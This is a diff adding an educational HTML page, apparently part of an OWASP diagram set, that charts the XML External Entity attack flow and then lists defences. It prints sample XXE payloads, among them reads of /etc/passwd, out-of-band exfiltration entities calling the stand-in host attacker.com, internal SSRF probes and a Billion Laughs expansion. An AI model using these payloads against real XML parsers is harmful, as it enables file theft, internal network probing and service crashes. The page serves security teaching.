@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE Attack Flow - OWASP Diagrams</title>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0d1117;
+            color: #00ff41;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #161b22;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+            border: 1px solid #30363d;
+        }
+        
+        h1 {
+            color: #00ff41;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0,255,65,0.5);
+        }
+        
+        .subtitle {
+            color: #8b949e;
+            margin-bottom: 30px;
+        }
+        
+        .mermaid {
+            text-align: center;
+            padding: 20px;
+            background: #0d1117;
+            border-radius: 8px;
+        }
+        
+        .description {
+            margin-top: 30px;
+            padding: 20px;
+            background: #0d1117;
+            border-left: 4px solid #00ff41;
+            border-radius: 4px;
+        }
+        
+        .description h2 {
+            color: #00ff41;
+            margin-bottom: 15px;
+        }
+        
+        .steps {
+            margin-top: 20px;
+        }
+        
+        .step {
+            margin: 15px 0;
+            padding: 15px;
+            background: #161b22;
+            border-radius: 5px;
+            border: 1px solid #30363d;
+        }
+        
+        .step-number {
+            display: inline-block;
+            background: #00ff41;
+            color: #0d1117;
+            padding: 5px 10px;
+            border-radius: 50%;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        
+        code {
+            background: #0d1117;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #ff6b6b;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .navigation {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px solid #30363d;
+            text-align: center;
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background: #00ff41;
+            color: #0d1117;
+            text-decoration: none;
+            border-radius: 5px;
+            margin: 5px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            background: #00cc33;
+            box-shadow: 0 0 15px rgba(0,255,65,0.5);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📄 XML External Entity (XXE) Attack Flow</h1>
+        <p class="subtitle">Exploiting XML Parser Vulnerabilities</p>
+        
+        <div class="mermaid">
+            flowchart TD
+                A[👤 Attacker] -->|1. Craft malicious XML| B[📝 XXE Payload]
+                B -->|2. Submit to application| C[🌐 Web Application]
+                C -->|3. Parse XML| D[⚙️ XML Parser]
+                D -->|4. Process external entity| E[🔓 External Entity Resolution]
+                E -->|5. Read local files| F[📁 File System Access]
+                E -->|6. Make HTTP requests| G[🌍 SSRF to Internal Network]
+                E -->|7. Trigger DoS| H[💥 Billion Laughs Attack]
+                F -->|8. Exfiltrate /etc/passwd| I[🔑 Sensitive Files]
+                G -->|9. Scan internal network| J[🏢 Internal Services]
+                H -->|10. Memory exhaustion| K[💣 Service Crash]
+                I -->|11. Return in response| C
+                J -->|12. Return data| C
+                C -->|13. Leak to attacker| A
+                
+                style A fill:#ff6b6b,stroke:#00ff41,stroke-width:2px,color:#fff
+                style B fill:#ffd43b,stroke:#00ff41,stroke-width:2px,color:#000
+                style C fill:#74c0fc,stroke:#00ff41,stroke-width:2px,color:#000
+                style D fill:#a855f7,stroke:#00ff41,stroke-width:2px,color:#fff
+                style E fill:#ff6b6b,stroke:#00ff41,stroke-width:2px,color:#fff
+                style F fill:#ff6b6b,stroke:#00ff41,stroke-width:2px,color:#fff
+                style G fill:#ff6b6b,stroke:#00ff41,stroke-width:2px,color:#fff
+                style H fill:#ff6b6b,stroke:#00ff41,stroke-width:2px,color:#fff
+                style I fill:#ff6b6b,stroke:#00ff41,stroke-width:2px,color:#fff
+                style J fill:#a855f7,stroke:#00ff41,stroke-width:2px,color:#fff
+                style K fill:#ff6b6b,stroke:#00ff41,stroke-width:2px,color:#fff
+                
+                L[🔒 Defense:<br/>Disable External Entities] -.->|Secure parser config| D
+                M[🛡️ Defense:<br/>Input Validation] -.->|Reject DOCTYPE| B
+                N[⚙️ Defense:<br/>Use JSON] -.->|Avoid XML| C
+                
+                style L fill:#00ff41,stroke:#00cc33,stroke-width:2px,color:#000
+                style M fill:#00ff41,stroke:#00cc33,stroke-width:2px,color:#000
+                style N fill:#00ff41,stroke:#00cc33,stroke-width:2px,color:#000
+        </div>
+        
+        <div class="description">
+            <h2>📋 Attack Flow Breakdown</h2>
+            
+            <div class="steps">
+                <div class="step">
+                    <span class="step-number">1</span>
+                    <strong>Classic XXE - File Disclosure:</strong> Read sensitive files from the server.
+                    <br><code>&lt;?xml version="1.0"?&gt;</code>
+                    <br><code>&lt;!DOCTYPE root [</code>
+                    <br><code>  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>
+                    <br><code>]&gt;</code>
+                    <br><code>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">2</span>
+                    <strong>Blind XXE - Out-of-Band Data Exfiltration:</strong>
+                    <br><code>&lt;!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/hostname"&gt;</code>
+                    <br>Server makes HTTP request to attacker with sensitive data
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">3</span>
+                    <strong>XXE to SSRF:</strong> Probe internal network through XML parser.
+                    <br><code>&lt;!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin"&gt;</code>
+                    <br><code>&lt;!ENTITY xxe SYSTEM "http://localhost:6379/"&gt; (Redis)</code>
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">4</span>
+                    <strong>Billion Laughs Attack (DoS):</strong> Exponential entity expansion.
+                    <br><code>&lt;!ENTITY lol "lol"&gt;</code>
+                    <br><code>&lt;!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"&gt;</code>
+                    <br><code>&lt;!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"&gt;</code>
+                    <br><code>...</code>
+                    <br>Causes massive memory consumption
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">5</span>
+                    <strong>Parameter Entity Injection:</strong> Use parameter entities for complex attacks.
+                    <br><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</code>
+                    <br><code>&lt;!ENTITY % eval "&lt;!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'&gt;"&gt;</code>
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">6</span>
+                    <strong>Office Document Exploitation:</strong> XXE in DOCX, XLSX, PPTX files.
+                    <br><code>Upload malicious Office document with XXE payload</code>
+                </div>
+                
+                <div class="step">
+                    <span class="step-number">7</span>
+                    <strong>SVG XXE:</strong> Embed XXE in SVG images.
+                    <br><code>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;</code>
+                    <br><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>
+                </div>
+            </div>
+            
+            <h2 style="margin-top: 30px;">🛡️ Defense Mechanisms</h2>
+            
+            <div class="steps">
+                <div class="step" style="border-left: 4px solid #00ff41;">
+                    <strong>✅ Disable External Entity Processing:</strong>
+                    <br>Configure XML parser to reject external entities and DTDs.
+                    <br><code>// Java</code>
+                    <br><code>factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</code>
+                    <br><code>factory.setFeature("http://xml.org/sax/features/external-general-entities", false);</code>
+                </div>
+                
+                <div class="step" style="border-left: 4px solid #00ff41;">
+                    <strong>✅ Use Secure Parser Libraries:</strong>
+                    <br>Use modern, secure XML libraries with safe defaults.
+                    <br><code>Python: defusedxml | .NET: XmlReader with secure settings</code>
+                </div>
+                
+                <div class="step" style="border-left: 4px solid #00ff41;">
+                    <strong>✅ Input Validation:</strong>
+                    <br>Reject XML with DOCTYPE declarations.
+                    <br><code>if (xml.contains("&lt;!DOCTYPE") || xml.contains("&lt;!ENTITY")) reject();</code>
+                </div>
+                
+                <div class="step" style="border-left: 4px solid #00ff41;">
+                    <strong>✅ Use JSON Instead of XML:</strong>
+                    <br>Prefer JSON for data exchange when possible.
+                    <br><code>REST APIs: Use JSON, avoid XML when not necessary</code>
+                </div>
+                
+                <div class="step" style="border-left: 4px solid #00ff41;">
+                    <strong>✅ Whitelist Allowed Protocols:</strong>
+                    <br>If external entities needed, whitelist specific protocols/URIs.
+                    <br><code>Allow only: https://trusted-domain.com/schemas/</code>
+                </div>
+                
+                <div class="step" style="border-left: 4px solid #00ff41;">
+                    <strong>✅ Patch and Update:</strong>
+                    <br>Keep XML parser libraries up-to-date.
+                    <br><code>Vulnerable: libxml2 &lt; 2.9.0, Xerces, etc.</code>
+                </div>
+                
+                <div class="step" style="border-left: 4px solid #00ff41;">
+                    <strong>✅ Network Segmentation:</strong>
+                    <br>Limit XML parser's network access to prevent SSRF.
+                </div>
+            </div>
+        </div>
+        
+        <div class="navigation">
+            <a href="../index.html" class="btn">← Back to Diagrams</a>
+            <a href="../../OWASP-Web/03-Injection/xxe.md" class="btn">Learn More About XXE</a>
+        </div>
+    </div>
+    
+    <script>
+        mermaid.initialize({ 
+            startOnLoad: true,
+            theme: 'dark',
+            flowchart: {
+                curve: 'basis',
+                padding: 20
+            }
+        });
+    </script>
+</body>
+</html>
